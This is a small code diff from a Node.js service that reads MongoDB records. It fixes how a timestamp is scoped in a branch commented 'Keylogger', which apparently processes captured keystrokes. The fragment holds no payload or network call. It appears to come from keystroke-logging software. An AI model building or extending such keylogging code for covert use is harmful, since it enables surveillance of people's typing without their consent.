@@ -626,11 +626,10 @@ MongoClient.connect(config.mongodb, function(err, db) {
 										})
 									} else if (record[type] == 1) {
 										// Keylogger
+										let timestamp = new Date()
 										try {
-											let timestamp = new Date(record[identifier])
-										} catch(e) {
-											let timestamp = new Date()
-										}
+											timestamp = new Date(record[identifier])
+										} catch(e) {}
 										// If the length is greater than 10,
 										if (record[keys]) {
 											let keystrokes = []
